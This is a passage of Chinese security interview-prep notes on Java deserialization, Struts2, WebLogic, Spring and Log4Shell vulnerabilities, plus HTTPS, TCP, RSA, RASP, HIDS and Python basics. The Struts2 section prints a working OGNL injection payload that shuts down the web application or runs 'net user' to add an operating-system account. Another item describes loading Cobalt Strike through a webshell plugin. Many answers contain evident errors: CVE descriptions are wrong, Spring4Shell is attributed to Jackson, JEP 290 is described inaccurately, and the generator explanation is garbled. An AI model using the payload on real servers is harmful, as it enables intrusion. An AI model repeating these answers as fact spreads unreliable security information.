> 3. 冰蝎中内置了一个名为"CSLoader"的插件，用于将Cobalt Strike中的Java类加载到内存中，并且在内存中执行指定的方法。"CSLoader"插件的具体实现可以参考冰蝎源码中的"com.rebeyond.behinder.payload.java.loader.CSLoader"类。
> 4. 当攻击者通过冰蝎将"CSLoader"插件上传到受控机器后，通过"CSLoader"插件，加载并执行Cobalt Strike中的Java类，从而实现Java联动Cobalt Strike上线。
> 
需要注意的是，这种Java联动Cobalt Strike的上线方式，需要在受控机器中安装Java运行环境，并且Cobalt Strike需要提前配置好监听器等相关配置信息。同时，这种方式虽然可以绕过一些杀软的检测，但也可能被一些安全产品监测到，因此需要在实际攻击中谨慎使用。


### 9. padding Oracle Attack讲讲
> Padding Oracle Attack（POA），即填充攻击，是一种利用加密算法中padding（填充）机制漏洞的攻击方式。它主要是利用了对称加密算法（如AES、DES等）中的padding机制的不安全性，通过对密文的修改来推断出明文内容。
> 在对称加密算法中，padding机制主要是为了保证加密后的密文长度是固定的，因为加密算法加密前的明文长度并不一定是加密算法块的整数倍。因此，padding机制会在明文的末尾添加一些特殊的字符，来使得明文长度达到加密块的整数倍。
> 在POA中，攻击者可以通过修改密文来推断出明文的内容。攻击者首先需要获取到一个密文，然后修改密文的最后一位，使得修改后的密文在解密时会产生一个padding错误。在这种情况下，服务器会返回一个错误消息，告诉攻击者密文中的padding错误，攻击者就可以根据这个错误消息来推断出明文的一部分内容。攻击者可以反复修改密文，不断推断出明文的内容，最终得到完整的明文。
> 对于防御POA，通常有以下几种方法：
> 1. 建议使用对称加密算法的GCM模式，GCM模式不需要padding机制，可以有效避免POA攻击。
> 2. 建议使用MAC机制，可以在加密后的密文上进行身份验证，以确保密文的完整性和真实性。
> 3. 建议使用加密库提供的默认配置，以避免配置不当导致的漏洞。
> 4. 建议对加密过程中使用的padding机制进行更加严格的检查，以确保padding机制的安全性。
> 5. 对于网站或应用程序，建议设置请求速率限制和IP地址限制等安全措施，以防止攻击者对网站进行大规模的POA攻击。

### 10. 除了readObject以外造成反序列化的函数有哪些
除了readObject以外，还有一些其他常见的造成反序列化的函数，包括：

1. readObjectNoData()：一个空方法，用于支持可序列化类的版本升级，防止在反序列化旧版本时出现错误。
2. readResolve()：用于控制序列化过程中生成的对象，防止出现重复对象的问题。
3. writeObject()：在对象序列化时调用，用于自定义序列化过程，对序列化内容进行加密或其他处理。
4. writeReplace()：在对象序列化时调用，用于替换被序列化的对象。

以上这些方法在序列化和反序列化过程中都可能被调用，因此都有可能成为反序列化攻击的目标。在进行 Java 序列化和反序列化时，需要格外小心这些方法的使用，防止被攻击者利用。

### 11. spring4shell和log4shell原理、检测和利用  
> Spring4Shell原理： Spring4Shell漏洞是Spring框架在使用Jackson Databind库进行反序列化时，由于使用了@RequestBody注解和@RequestMapping注解等，导致远程攻击者可以通过精心构造的HTTP请求中的序列化数据实现任意代码执行。攻击者可以通过构造的序列化数据绕过Jackson的反序列化保护机制，导致远程执行任意命令或代码。
> Log4Shell原理： Log4Shell漏洞是由于Log4j库在使用JNDI时，会自动尝试加载远程资源，攻击者利用这一特性，将JNDI地址设置为恶意的RMI服务地址，将恶意的Java代码注入到JNDI中，通过精心构造的序列化数据触发远程执行恶意代码。

### 12.Fastjson和Jackson反序列化原理讲讲
> Fastjson和Jackson都是流行的Java反序列化库，它们的反序列化原理有所不同。
> Fastjson反序列化原理：
> Fastjson使用的是基于JSONPath的反序列化方式，其反序列化过程大致如下：
> 1. 读取JSON数据并解析出对应的JSON对象；
> 2. 根据目标Java类的结构，构造出反序列化的模型；
> 3. 使用JSONPath定位到JSON对象中对应的属性，并通过模型对应的反序列化方法将其转换为目标Java对象。
> 
在实现上，Fastjson使用了Java反射机制来构造目标Java对象，并通过访问器方法（setter）将JSON对象的属性值设置到Java对象中。Fastjson在执行反序列化过程时，可以支持多种反序列化方法，例如默认的JavaBean反序列化、反射构造函数反序列化、集合类型反序列化等。由于Fastjson使用JSONPath来定位JSON对象中的属性，因此在一定程度上也可以支持嵌套的属性映射。
> Jackson反序列化原理：
> Jackson使用的是基于树模型的反序列化方式，其反序列化过程大致如下：
> 1. 读取JSON数据并解析出对应的JSON树；
> 2. 根据目标Java类的结构，构造出反序列化的模型；
> 3. 使用模型对应的反序列化方法，将JSON树转换为目标Java对象。
> 
在实现上，Jackson使用了Java反射机制来构造目标Java对象，并通过访问器方法（setter）将JSON对象的属性值设置到Java对象中。Jackson在执行反序列化过程时，可以支持多种反序列化方法，例如默认的JavaBean反序列化、反射构造函数反序列化、集合类型反序列化等。Jackson还提供了一些扩展点，可以让用户自定义反序列化逻辑，例如使用@JsonDeserialize注解标注反序列化器类。
> 综上所述，Fastjson和Jackson的反序列化原理都是使用Java反射机制来构造目标Java对象，并将JSON对象的属性值设置到Java对象中，只不过Fastjson使用的是基于JSONPath的反序列化方式，而Jackson使用的是基于树模型的反序列化方式。

### 13. XStream反序列化
> XStream是一种Java类库，用于将Java对象转换为XML格式，并且可以反向操作，将XML格式的数据反序列化为Java对象。然而，XStream在反序列化时存在安全漏洞，攻击者可以利用这些漏洞实现远程代码执行。
> XStream反序列化的原理与其他反序列化漏洞类似，攻击者可以通过构造恶意的XML数据来触发漏洞。具体地说，攻击者可以构造一个带有恶意数据的XML文件，并将其发送给受害者。当受害者使用XStream库将XML数据反序列化为Java对象时，攻击者就可以在该过程中插入恶意代码，从而实现远程代码执行。
> XStream反序列化漏洞的修复方法包括使用XStream的安全模式，限制反序列化的类以及使用类型转换器。此外，更新到最新版本的XStream也可以有效地解决这些漏洞。
> 检测和利用XStream反序列化漏洞的工具和方法类似于其他反序列化漏洞，常用的工具包括ysoserial、XStream-Attack和XStream-Converter。攻击者可以使用这些工具构造恶意的XML数据，然后将其发送给目标系统，以实现远程代码执行。而防御方面，则需要对反序列化过程进行严格的控制和限制。

### 14. JEP290的原理
> JEP 290是Java 9中引入的一项安全增强功能，目的是限制Java对象反序列化时，能够被反序列化的类的数量。在JEP 290之前，Java反序列化时会自动查找并加载可以被反序列化的类，这使得攻击者可以通过在反序列化数据中包含恶意类的定义，来执行远程代码执行攻击。
> JEP 290通过添加一个新的反序列化特性，即“SerializedObject限制”，来解决这个问题。SerializedObject限制功能允许Java开发人员明确指定哪些类可以被反序列化，而忽略所有其他的类。这种限制可以通过Java安全管理器（SecurityManager）来实现，它允许开发人员在反序列化过程中检查反序列化操作的源和目标，以确保反序列化的安全性。
> 实现SerializedObject限制的方式是，定义一个可以被反序列化的类白名单，只有在白名单中的类才可以被反序列化。这个白名单可以使用反序列化器的默认配置或者自定义配置来指定。默认情况下，Java 9仅允许反序列化Java库中的类，并禁止反序列化用户自定义类。
> 总的来说，JEP 290的目的是增强Java对象反序列化的安全性，限制反序列化时能够被反序列化的类的数量，从而减少恶意代码注入的风险。

### 15. RMI原理以及相关的漏洞
> RMI（Remote Method Invocation，远程方法调用）是Java的一种远程通讯机制，允许在不同的Java虚拟机之间进行通讯和交互。通过RMI，一个Java虚拟机中的对象可以透明地调用另一个Java虚拟机中的对象的方法，就像本地方法调用一样简单。
> RMI中的远程对象必须继承Remote接口，其方法也必须声明抛出RemoteException异常。客户端通过Naming.lookup()或者Registry.lookup()方法获得远程对象的引用，并像调用本地方法一样调用远程对象的方法。
> RMI的漏洞主要与Java远程代码执行相关，包括：
> 1. 反序列化漏洞：因为RMI需要将对象进行序列化和反序列化，如果没有正确的限制和过滤，攻击者可以构造恶意的序列化数据，导致服务器执行任意代码。例如，2015年爆出的Apache Commons Collections库反序列化漏洞（CVE-2015-7501），攻击者可以通过构造恶意的序列化数据，在服务端上执行任意代码。
> 2. JNDI注入漏洞：Java命名和目录接口（Java Naming and Directory Interface，JNDI）提供了在Java应用程序中访问命名和目录服务的API，而Java应用程序中的任何对象都可以绑定到JNDI目录树中。攻击者可以通过JNDI注入漏洞，将远程对象绑定到恶意的JNDI服务中，当服务器尝试访问该服务时，就会执行攻击者控制的代码。例如，2017年爆出的Spring框架中的JNDI注入漏洞（CVE-2017-8046），攻击者可以通过构造恶意的URL，将恶意对象绑定到JNDI服务中，从而执行任意代码。
> 3. 非安全的RMI服务：如果RMI服务没有正确地配置和限制，攻击者可以轻易地通过RMI协议直接调用服务端的方法，执行恶意代码。例如，2012年爆出的Java RMI远程代码执行漏洞（CVE-2012-5076），攻击者可以构造恶意的RMI请求，直接在服务端上执行任意代码。
> 
防御RMI漏洞的方法主要包括：
> 1. 序列化和反序列化过滤：对于RMI服务端收到的所有序列化数据，应该进行过滤和校验，确保数据的合法性和安全性。例如，可以使用序列化过滤器或者自定义序列化和反序列化方法，对反序列化数据进行限制和过滤。

### 16. Spring相关的RCE原理
> Spring框架中的RCE漏洞主要是由于Spring框架中的表达式语言（SpEL）的不安全使用导致的。
> 具体来说，Spring框架中的SpEL是一种强大的表达式语言，可以在配置文件中使用，用于定义各种Spring组件的属性。然而，由于SpEL的语法非常灵活，允许在表达式中调用Java方法、访问对象属性等等，这也使得攻击者可以构造恶意的SpEL表达式，实现远程命令执行攻击。
> 其中，比较著名的Spring RCE漏洞包括：
> 1. Spring MVC 远程代码执行漏洞（CVE-2017-4971）：该漏洞是由于Spring MVC在处理文件上传时，没有正确校验文件内容导致，攻击者可以在上传的文件中嵌入恶意的SpEL表达式，从而实现远程代码执行。
> 2. Spring Data Commons 远程代码执行漏洞（CVE-2018-1273）：该漏洞是由于Spring Data Commons中的SpEL表达式没有正确限制攻击者的输入导致，攻击者可以在构造的参数中注入恶意的SpEL表达式，实现远程代码执行。
> 3. Spring Cloud Config 远程代码执行漏洞（CVE-2019-3799）：该漏洞是由于Spring Cloud Config没有正确校验Git仓库中的配置文件导致，攻击者可以在配置文件中注入恶意的SpEL表达式，实现远程代码执行。

### 17. IIOP和T3反序列化原理
> 在IIOP和T3中，对象的序列化和反序列化是通过Java的标准序列化机制来实现的。攻击者可以构造恶意的序列化数据，并发送给服务端进行反序列化，从而实现远程代码执行的攻击。
> IIOP和T3的漏洞与Java反序列化漏洞非常相似。攻击者通过构造恶意序列化数据，将一些Java对象的类路径和方法名伪装成服务端上可以被调用的对象，然后将序列化数据发送给服务端进行反序列化，从而实现远程代码执行。
> 例如，在WebLogic T3协议中，攻击者可以通过发送恶意的T3请求来触发反序列化漏洞，从而实现远程命令执行。攻击者构造的恶意请求包含了一个被攻击者服务器上的特定Java类的名称，这个Java类实现了Java序列化接口，并在反序列化时触发了远程命令执行。
> 针对IIOP和T3反序列化漏洞的防御措施与Java反序列化漏洞相似，包括禁止从不可信的数据源反序列化数据、禁用危险的Java类、使用安全的序列化库、对反序列化数据进行签名和验证等。

### 18. weblogic 反序列化原理
> 有一个 xml 反序列化漏洞 还有后台文件上传 还有二次 urldecode权限绕过
> 
> 1. 反序列化漏洞：WebLogic使用T3协议进行通信，而T3协议使用JRMP（Java Remote Method Protocol）进行序列化和反序列化，从而导致了反序列化漏洞的出现。最常见的就是CVE-2017-10271漏洞，攻击者可以通过构造恶意的XML数据来触发反序列化漏洞，从而执行任意代码。
> 2. 路径穿越漏洞：WebLogic的Web控制台存在路径穿越漏洞，攻击者可以通过该漏洞访问系统中的任意文件，获取敏感信息或者执行任意代码。
> 3. JNDI注入漏洞：WebLogic的JNDI服务提供了远程访问其他资源的能力，攻击者可以通过构造特殊的JNDI名称，注入恶意对象，从而执行任意代码。
> 4. XML外部实体注入漏洞：WebLogic的XML解析器存在外部实体注入漏洞，攻击者可以通过在XML数据中注入特定的实体，从而读取系统中的敏感文件或者执行任意代码。




### 19. 内存马扫描原理，如何检测内存马
> 内存马扫描可以通过对进程的内存进行扫描和分析，来检测是否存在恶意代码注入，通常使用的是基于特征码（Signature）的检测方法，即通过预先定义的恶意代码特征码进行匹配，来识别出恶意代码。内存马扫描通常包括以下几个步骤：
> 1. 获取进程列表：获取当前系统中所有正在运行的进程列表。
> 2. 扫描进程内存：对进程内存进行扫描，提取可疑的二进制代码。
> 3. 提取二进制代码：提取扫描到的二进制代码，并对其进行解码和反汇编。
> 4. 特征码匹配：根据预先定义的恶意代码特征码，对提取的代码进行匹配，识别出恶意代码。
> 5. 检测报告输出：输出检测报告，包括恶意代码的类型、文件路径、MD5等信息。
> 
如何检测内存马：
> 1. 基于进程的检测：通过扫描系统进程内存，识别出恶意代码注入的进程。
> 2. 基于特征码的检测：通过对进程内存进行特征码匹配，识别出恶意代码。
> 3. 基于行为的检测：通过对进程行为进行监控和分析，识别出恶意行为并判断是否存在内存马。
> 4. 基于异常检测：通过对进程的异常行为进行监控，如进程的异常停止、崩溃等，识别是否存在内存马。
> 
需要注意的是，内存马扫描的效果取决于特征码的质量，如果特征码不完善，可能会漏报或误报。因此，为了提高检测效果，需要不断完善和更新特征码库。此外，为了避免误报，需要进行手动确认或采用多种检测方法结合的方式来检测内存马。



### 20. ysoserial 原理
> YSOserial是一款常用于Java反序列化漏洞利用的工具，它的原理是基于Java的序列化和反序列化机制，通过构造特定的序列化对象来触发目标系统中的反序列化操作，从而达到执行恶意代码的目的。
> 具体来说，YSOserial会根据不同的目标系统，选择不同的攻击载体，如利用Java集合类、利用JNDI、利用JMX等等。通过精心构造这些攻击载体，使其在反序列化过程中触发目标系统中的漏洞，从而执行攻击者精心构造的恶意代码。
> 例如，YSOserial中的“CommonsCollections1”攻击载体，利用了Java的反射机制和“Apache Commons Collections”库中的漏洞，在反序列化过程中触发目标系统中的漏洞，从而执行恶意代码。
> 检测内存马可以采用多种方式，如使用防病毒软件、检查系统进程、查看系统文件、检测系统服务等等。常用的工具包括杀毒软件、系统监控工具、文件监控工具、端口监控工具等。对于特定的内存马，还可以使用专门的检测工具进行检测。


###  21. Springboot+shiro 环境如何进行渗透  
> spring/shiro反序列化
> shirio权限绕过
> spring boot 信息泄露
> Spring Boot的一些组件可能存在漏洞，例如Spring MVC、Spring Security等  



### 22. java 反序列化 php 反序列化 python 反序列化的区别和相同点
>  都是将序列化的对象还原成可执行的代码或者其他形式的对象。但由于语言特性和实现方式的不同，它们在反序列化过程中存在一些不同点。  
> 
> java 反序列化需要利用链，Java 反序列化是通过 ObjectInputStream 类实现的，反序列化的过程就是读取序列化后的数据流并将其转换成 Java 对象。Java 反序列化漏洞通常会导致恶意代码执行、敏感数据泄漏等问题。
> php反序列化也需要利用链，PHP 反序列化通常是通过 unserialize() 函数实现的，该函数接收一个序列化字符串，并将其转换成 PHP 对象。PHP 反序列化漏洞可能会导致远程代码执行、文件删除等问题。
> python反序列化不需要利用链，有一个__reduce__可以自己构造命令执行；Python 反序列化是通过 pickle 模块实现的，pickle 模块提供了 dump() 和 load() 方法用于序列化和反序列化。Python 反序列化漏洞可能会导致任意代码执行、服务器接管等问题。


### spring 常见漏洞
> 


### st2 漏洞原理
> 045 错误处理引入了ognl表达式 
> 048 封装action的过程中有一步调用getstackvalue递归获取ognl表达式 反序列化 操作对象，通过手段引入。
>  

```basic
Struts2 的核心是使用的 webwork 框架,处理 action 时通过调用底层的getter/setter 方法来处理 http 的参数,它将每个 http 参数声明为一个 ONGL(这里是 ONGL 的介绍)语句。当我们提交一个 http 参数: 
?user.address.city=Bishkek&user['favoriteDrink']=kumys ONGL 将它转换为:action.getUser().getAddress().setCity("Bishkek")action.getUser().setFavoriteDrink("kumys") 
这是通过 ParametersInterceptor(参数过滤器)来执行的,使用用户提供的 HTTP 参数调用 ValueStack.setValue()。 为了防范篡改服务器端对象,XWork的ParametersInterceptor不允许参数名中 出现“#”字符,但如果使用了 Java 的 unicode 字符串表示\u0023,攻击者就可以绕过保护,修改保护Java 方式执行的值: 此处代码有破坏性,请在测试环境执行,严禁用此种方法进行恶意攻击 

?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean("false")))& (asdf)(('\u0023rt.exit(1)')(\u0023rt\u003d@java.lang.Runtime@getRunti me()))=1 

转义后是这样: 

?('#_memberAccess['allowStaticMethodAccess']')(meh)=true&(aaa)(('#c 
ontext['xwork.MethodAccessor.denyMethodExecution']=#foo')(#foo=new%20java.lang.Boolean("false")))&(asdf)(('#rt.exit(1)')(#rt=@java.lang.Ru 
ntime@getRuntime()))=1 

OGNL 处理时最终的结果就是 
java.lang.Runtime.getRuntime().exit(1); //关闭程序,即将 web 程序关闭 类似的可以执行 
java.lang.Runtime.getRuntime().exec("net user 用户名 密码 /add");
//增 加操作系统用户,在有权限的情况下能成功(在 URL 中用%20 替换空格,%2F 替换 /) 

只要有权限就可以执行任何 DOS 命令 

ongl 在这个 payload 中起了什么作用？ 

Ognl 表达式语言，Struts 标签默认支持的表达式语言，必须配置 Struts 标签用,不能离开 Struts 标签直接使用，就是说 Ognl 必须在 Struts 中使
```


### java反序列化漏洞
漏洞原理
> 反序列化就那两个函数 最后调用了writeobject和readobject方法 重写readobject方法可以做到反序列化

> 1. Java序列化指Java对象转换为字节序列的过程
> 2. Java反序列化指字节序列恢复为Java对象的过程
> 3. Commons-collections 爆出第一个漏洞开始，Java反序列化漏洞的事件就层出不穷。
> 4. 在Java中,利用ObjectInputStream的readObject方法进行对象读取
> 5. 可以深入了解 ysoserial有哪些gadgets

### log4j 原理


### weblogic

[weblogic 权限绕过](https://blog.csdn.net/weixin_45728976/article/details/109512848)

### weblogic 漏洞种类
weblogic就好多了，基于T3协议的反序列化；基于xml解析时候造成的反序列化，还有ssrf，权限绕过等等。


### fastjson 反序列化漏洞利用原理, 常见利用链，cc链原理
[fastjson漏洞利用原理](https://www.cnblogs.com/hac425/p/9800288.html 作者：掌控安全学院 https://www.bilibili.com/read/cv10347736 出处：bilibili)
> 在请求包里面中发送恶意的json格式payload，漏洞在处理json对象的时候，没有对@type字段进行过滤，从而导致攻击者可以传入恶意的TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数。



## PHP
```
●php反序列化漏洞的原理 
PHP中如何使用phar://伪协议触发反序列化，利用场景以及前提条件有哪些?(★★)
● 如何绕过php.ini中disable_function的限制，有哪些方法，其中成功率最高的方法是哪个，为什么?(★★★)
● 文件上传中%00截断的原理是什么，官方是如何设计修复方案的?(★★)
● 实现一个一句话webshell，绕过RASP的方式有哪些，绕过机器学习检测的方式有哪些，绕过AST-Tree的方式有哪些(★★)
● PHP伪协议的攻击场景有哪些？(★★)
● mail函数的攻击面有哪些?(★)
● 如何不通过数字以及字符构造webshell，其原理是什么，此类特性还会造成什么安全问题?(★)
```


## 企业安全
### 1. HTTPS是如何实现的

HTTPS 协议使用 SSL/TLS 来加密HTTP协议,为网页访问提供加密和验证机制,保证在 Internet 上的数据传输安全。
HTTPS 的工作原理如下:
1. 使用数字证书。网站需要申请并安装数字证书,这个证书能够验证网站服务器的身份。
2. 建立 SSL 连接。当用户访问 HTTPS 网站时,网站服务器会向用户发送网站的数字证书和公钥。用户的浏览器会验证证书的有效性,如果证书有效,浏览器会使用证书中的公钥加密一个对称密钥,然后发送给服务器。
3. 共享对称密钥。服务器使用私钥解密浏览器发送的信息得到对称密钥。此后,浏览器和服务器会使用该对称密钥来加密通信内容。
4. 加密通信内容。对称密钥用于加密传输的数据,从而实现网页内容和信息的安全传输。
5. 验证消息完整性。HTTPS 还使用**消息认证码(MAC)**来验证传输内容是否被改变,避免中间人攻击。
这整个过程可以概括为:

1. 使用证书验证服务器和用户身份
2. 交换对称密钥(通过非对称加密)
3. 使用对称密钥加密通信内容(对称加密)
4. 验证消息完整性(通过MAC)

HTTPS 协议需要 CA 证书机构为网站签发数字证书,通过证书确保用户正在访问的是合法网站,并不是钓鱼网站或其他欺诈网站。同时,它使用加密算法来保护数据传输的隐私和安全。所以,HTTPS 协议能够有效防止 Man-In-The-Middle 攻击和窃听风险,提供更高层次的安全性和数据隐私保护。

#### 怎么进行证书校验
当客户端访问一个HTTPS网站时,服务器会向客户端发送自己的数字证书。客户端会对这个证书进行验证,判断其是否是合法有效的。客户端主要通过以下方式验证证书的合法性:

1. 证书链验证:检查证书的颁发机构是否是客户端信任的CA,并验证证书链中所有证书的有效性和关系。客户端 maintains 一个可信CA证书列表,只信任这些CA颁发的证书。
2. 有效期验证:检查证书的有效期是否已过期或尚未生效。
3. 吊销列表验证:检查证书是否已被吊销。客户端需要从证书颁发机构的 CRL 或 OCSP 获取最新的证书吊销信息。
4. 主题名称验证:检查证书上的主题名称与网站URL是否匹配。以防止中间人攻击。
5. 公钥验证:使用证书中包含的公钥对服务器返回的数字签名进行验证。确保公钥正确属于服务器。

如果以上所有的验证都通过,则证明网站提供的数字证书是合法有效的,客户端可以信任该证书并与服务器建立SSL连接。
否则,如果有任一步验证失败,客户端会提示用户该证书不受信任并询问用户是否继续访问该网站。因为有可能遭遇中间人攻击。
比较理想的情况是,客户端信任的CA已经在可信CA列表中,证书也已经在最新的CRL或OCSP列表中确认未被吊销,证书包含的所有信息也与网站匹配。
这时候,客户端可以确信匹配的证书意味着与指定网站的真实可信连接,可以继续通信而无需提示用户。
所以,HTTPS 的安全性很大程度上依赖于公钥基础设施(PKI)的安全性和健全性。只有当所有参与主体都可以正确验证彼此的数字证书,HTTPS 连接才可能真正安全。
### 2. TCP三次握手四次挥手

TCP 连接建立时需要进行三次握手,释放时需要进行四次挥手。这是为了保证连接的可靠性。
**TCP三次握手**
1. 客户端发送SYN报文给服务器,携带客户端的初始序列号seq=x。
2. 服务器响应一个SYN+ACK报文,同时将一个随机产生的初始序列号ack=x+1以确认客户的SYN报文,并携带自己的初始序列号seq=y。
3. 客户端再发送一个ACK报文作为确认,携带ack=y+1,确认服务器的SYN+ACK报文,此时TCP连接建立成功。
这个三步握手的目的是同步序列号,交换队首,确认双方都准备好了建立连接。
**TCP四次挥手**
1. 主动关闭方发送FIN报文,用来关闭主动方到被动方的数据传送,之后主动方不能再发送数据,只能接收数据。
2. 被动关闭方收到FIN报文后,发送ACK确认报文,确认序号为收到FIN报文的序号加1。被动方可以继续发送数据到主动方。
3. 被动关闭方发送FIN报文,请求关闭连接。
4. 主动关闭方收到FIN后,发送ACK确认报文,确认序号为收到FIN报文的序号加1。
此时,双方都发送了FIN报文,不能再发送数据,只剩下TIME_WAIT状态,等待2MSL秒后,完成四次挥手,彻底关闭TCP连接。

**四次挥手的目的是:**

1. 由主动方发送的FIN报文请求半关闭连接,被动方确认;
2. 被动方也进行半关闭,主动方再次确认;
3. 双方都进行半关闭后,通过TIME_WAIT状态等待2MSL秒,如果这期间没有收到重传的数据报文,则说明主动方和被动方都已经正确关闭,此时完成四次挥手,彻底关闭TCP连接。

这能够保证连接的完全可靠关闭,释放资源。


### 3. RSA加解密流程

**加密流程**
```

1. 获取两个不同的大质数p和q,计算n = p * q,n是模数。
2. 计算欧拉函数φ(n) = (p - 1) * (q - 1)。
3. 选择一个整数e,e和φ(n)互质,e是公钥指数。
4. 计算d,使得ed ≡ 1 (mod φ(n)),d是私钥指数。
5. 获取明文消息m。
6. 计算密文c ≡ m^e (mod n)。
7. 公钥是(n, e),私钥是d。

```
**解密流程**
```
1. 接收密文c和公钥(n, e)。
2. 计算明文m ≡ c^d (mod n)。
3. 使用私钥d进行解密。
```
RSA算法的安全性建立在大整数分解的困难性之上。目前 fastest 算法破解RSA也需要极长时间,所以RSA是一种较为安全的非对称加密算法。

### 4. 介绍自己常用的python库
```
1. Requests - 请求库,用于发起HTTP请求,是渗透测试和网络爬虫必备库。
2. BeautifulSoup - 网页解析库,用于解析HTML和XML数据。常用于解析爬虫爬取的网页数据。
3. Scrapy - 爬虫框架,可以用来写爬虫程序爬取网站数据。
4. Paramiko - SSH客户端和服务器的Python实现。可以用它进行SSH登录和执行命令。
5. Metasploit - 渗透测试框架,可以用来漏洞检测、渗透攻击等。Metasploit有Python接口可以直接调用。
6. Nmap - 网络扫描和主机发现工具。Nmap有Python API可以直接在Python程序中调用Nmap扫描。
7. Flask - 微框架,可以用它开发自己的 web 应用。在渗透测试中可以用它开发钓鱼网站或者命令执行平台。
8. Django - 全能框架,功能更加强大的Web框架。在渗透测试中也可以用于开发钓鱼网站或命令执行平台。
9. PyV8 - Google V8引擎的Python绑定,可以用它在Python中执行JavaScript代码。
10. OpenSSL - 加密库的Python封装,提供各种加密算法和TLS相关功能。在渗透测试中可用于加密通信等。


安全开发人员常用的Python库有:
1. Hashids - 用于生成短ID,以屏蔽真实ID。
2. Passlib - 用于安全的密码哈希和验证。支持多种哈希算法和密码散列。
3. PyCrypto - 古老但稳定的加密库,提供各种对称加密算法和Hash算法。
4. Cryptography - 现代加密库,提供更丰富的加密算法和协议支持。是PyCrypto的替代品。
5. OpenSSL - OpenSSL库的Python绑定,提供SSL/TLS功能和各种加密算法。
6. Keyczar - 加密框架,简化加密操作,支持多种算法和协议。
7. JWT - JSON Web Tokens,用于在身份验证中传递声明。
8. Bcrypt - 专注于BSD BCrypt哈希,用于安全的密码存储。
9. Scrypt - Scrypt键派生函数,也可用于安全的密码存储。
10. Django-Defender - Django应用防火墙,提供登录保护、IP限制等功能。
11. SQLAlchemy - ORM框架,提供SQL注入防护。
12. HTML Purifier - 清理和过滤HTML,防止XSS攻击。
13. Automat - 有限状态机库,用于构建复杂的匹配和解析程序。
14. shelter - 用于扫描和清理代码中的安全隐患,如SQLi、XSS等。

```

### 5. 讲讲rasp原理和对抗
RASP(Runtime Application Self-Protection)是一种运行时应用自保护技术。它通过动态检测应用程序运行时的恶意行为来防御威胁,从而保护应用程序安全。
RASP的主要原理有:
```
1. HOOK - 在应用运行时钩取(HOOK)应用程序的函数调用,监控函数调用的参数和上下文,检测异常行为。
2. 虚拟补丁 - 不修改源代码的情况下,通过预知的HOOK在运行时修改应用程序的控制流,修复已知的漏洞。
3. 沙箱 - 通过隔离运行环境限制应用程序只能访问必要的系统资源,阻止未授权的资源访问。
4. 行为检测 - 分析应用程序运行时的行为特征,检测持续性威胁如SQL注入、XSS等。
```
RASP也面临以下对抗手段:
```
1. HOOK绕过 - 攻击者通过分析RASP的HOOK方法,构造参数或输入绕过HOOK的检测。
2. 沙箱逃逸 - 攻击者通过漏洞利用从RASP沙箱中逃逸,获取对系统的完全控制。
3. 反调试 - 攻击者使用反调试技术对抗RASP的行为检测和HOOK,隐藏实际行为。
4. 无文件攻击 - 攻击者构造无文件攻击方式,避开RASP的静态检测。
5. 零日攻击 - 针对未知漏洞的利用,RASP难以通过虚拟补丁完全防御。
```
所以,RASP并非完美的防御方式,实际上攻防双方在技术上展开竞争。RASP解决方案也需要不断升级来抵御新的威胁与对抗技术。


### 6. 如果让你设计一个HIDS，应该如何设计
HIDS(主机入侵检测系统)用来检测主机上的恶意活动,如果让我来设计一个HIDS,我会考虑以下几点:
```
1. 安装位置:应该在关键资产主机上安装,如数据库服务器、应用服务器等。可以安装在主机的关键位置,如内核、系统调用层等。
2. 检测技术:结合多种检测技术,如:
  - 文件完整性监控:监控关键文件是否被非授权修改。
  - 日志分析:分析系统日志、应用日志,检测异常登录、访问等。
  - 进程监控:监控关键进程和线程的启动、结束,检测异常进程。
  - 内存分析:分析内存使用情况,检测异常的内存分配、代码注入等。
  - 网络流量分析:分析网络数据包,检测异曲同工的传输、攻击指令等。
3. 自定义规则:除了基于签名的检测外,也要提供自定义规则的功能,让安全人员根据实际情况添加规则。
4. 威胁情报:要有定期的威胁情报更新,使HIDS能检测最新的攻击手法和漏洞利用。
5. 反欺骗:HIDS自身也需要具备一定的反欺骗能力,避免被攻击者通过技术手段绕过或DISABLE。
6. 报警机制:当检测到威胁时,要及时准确的报警给安全人员,并提供详细的威胁分析报告。
7. 管理机制:需要提供用户友好的管理机制,如WEB GUI、命令行等,方便安全人员配置、操作和管理HIDS。
```
所以,一个设计良好的HIDS应该具有显著的检测与响应能力,通过多层技术手段全面监控主机,并能主动快速准确的响应与威胁报警,这也是衡量一个HIDS产品好坏的关键指标。 
### 7. 介绍一下Python中的迭代器、生成器、装饰器

**迭代器**
迭代器是访问集合元素的一种方式。迭代器对象从集合的第一个元素开始访问,直到所有的元素被访问完结束。

- 迭代器有两个基本方法:iter() 和 next()。iter() 创建一个迭代器,next()返回迭代器的下一个元素。
- 可以被迭代的数据类型有:列表、元祖、字符串、集合、字典等。这些数据类型的迭代器通过iter()函数获得。
- 定义一个迭代器,只需要实现__iter__()和__next__()方法。__iter__()返回迭代器对象自身,__next__()返回下一元素,如果没有更多元素则触发StopIteration异常。

**生成器**

-  生成器是一种特殊的迭代器。生成器函数使用 yield 关键字,每次遇到 yield 时函数会暂停并保存当前所有的运行信息,返回 yield 的值,并在下一次执行 next() 方法时从当前位置继续运行。
-  生成器十分高效,可以弹出巨大的数据集而占用很小的内存空间。
-  使用生成器,只需要把 () 改为 () 即可将一个函数变为生成器函数。

**装饰器**

-  装饰器允许在将函数作为参数传递给另一个函数后,在内部对其进行修饰,并返回一个新函数。
-  装饰器可以在不必更改函数代码和调用方式的情况下,增强函数的功能。
-  定义装饰器使用@语法,放在被装饰的函数的上一行。
-  装饰器接受一个函数作为参数,并返回另一个接受同样的参数但具有额外功能的函数。
-  装饰器在Python实现中就是闭包,它可以访问在装饰时定义的所有变量。
-  常见的装饰器有:classmethod、staticmethod、property、functools.lru_cache等。
### 8. 简述Python中的GIL锁，以及如何打破GIL锁的限制
> GIL是Python中的全局解释器锁(Global Interpreter Lock)。它使得任何时刻只有一个线程在执行字节码,无法利用多核CPU实现并行计算。
> GIL的目的是为了保证Python对象的内存一致性和线程安全,但它也成为了Python多线程性能不高的一个重要原因。

**要打破GIL锁的限制,有以下几种方式:**

1.  多进程:GIL锁的限制只在一个进程内部,不同进程之间不受影响。所以可以使用多进程实现真正的并行计算,如multiprocessing模块。
